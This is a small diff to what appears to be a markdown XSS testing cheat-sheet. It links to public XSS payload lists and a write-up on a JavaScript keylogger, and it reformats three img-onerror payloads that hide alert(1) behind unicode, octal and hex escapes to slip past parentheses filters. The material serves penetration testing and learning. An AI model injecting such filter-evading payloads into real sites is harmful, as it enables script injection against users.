@@ -82,10 +82,6 @@ https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xs
 
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt
 
-Examples:
-
-xss.txt
-
 ### XSS Keylogger
 
 https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/
@@ -162,11 +158,11 @@ Add execution sink for execution:
   
 ### Escaping Parentheses
   
--> <img src=x onerror="\u0061lert(1)"/>
+\<img src=x onerror="\u0061lert(1)"/>
   
--> <img src=x onerror="eval('\141lert(1)')"/>
-  
--> <img src=x onerror="eval('\x61lert(1)')"/>
+\<img src=x onerror="eval('\141lert(1)')"/>
+
+\<img src=x onerror="eval('\x61lert(1)')"/>
   
 ### Others Examples
   
